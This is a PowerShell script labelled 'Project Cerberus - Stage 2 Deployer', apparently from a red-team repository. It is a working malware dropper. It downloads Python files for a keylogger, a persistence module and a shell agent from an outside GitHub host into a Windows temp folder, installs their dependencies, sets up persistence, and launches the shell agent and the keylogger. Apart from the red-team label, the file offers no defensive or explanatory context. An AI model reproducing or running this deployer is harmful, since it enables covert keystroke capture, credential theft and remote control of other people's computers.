# Project Cerberus - Stage 2 Deployer

$dir = "C:\Windows\Temp\cerberus"
$base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/master/red-team/keylogger"
$log = "C:\Windows\Temp\cerberus_deploy.log"

"[+] Deploy started $(Get-Date)" | Out-File $log

New-Item -ItemType Directory -Force -Path $dir | Out-Null
"[+] Directory created" | Out-File $log -Append

Invoke-WebRequest -Uri "$base/config.py"        -OutFile "$dir\config.py"
"[+] config.py downloaded" | Out-File $log -Append
Invoke-WebRequest -Uri "$base/keylogger.py"     -OutFile "$dir\keylogger.py"
"[+] keylogger.py downloaded" | Out-File $log -Append
Invoke-WebRequest -Uri "$base/persistence.py"   -OutFile "$dir\persistence.py"
"[+] persistence.py downloaded" | Out-File $log -Append
Invoke-WebRequest -Uri "$base/shell_agent.py"   -OutFile "$dir\shell_agent.py"
"[+] shell_agent.py downloaded" | Out-File $log -Append
Invoke-WebRequest -Uri "$base/requirements.txt" -OutFile "$dir\requirements.txt"
"[+] requirements.txt downloaded" | Out-File $log -Append

pip install -r "$dir\requirements.txt" -q
"[+] pip install done" | Out-File $log -Append

python "$dir\persistence.py"
"[+] persistence.py ran" | Out-File $log -Append

Start-Process python -ArgumentList "$dir\shell_agent.py" -WorkingDirectory $dir -WindowStyle Normal
"[+] shell_agent launched" | Out-File $log -Append

Start-Process python -ArgumentList "$dir\keylogger.py" -WorkingDirectory $dir -WindowStyle Normal
"[+] keylogger launched" | Out-File $log -Append

"[+] Deploy complete $(Get-Date)" | Out-File $log -Append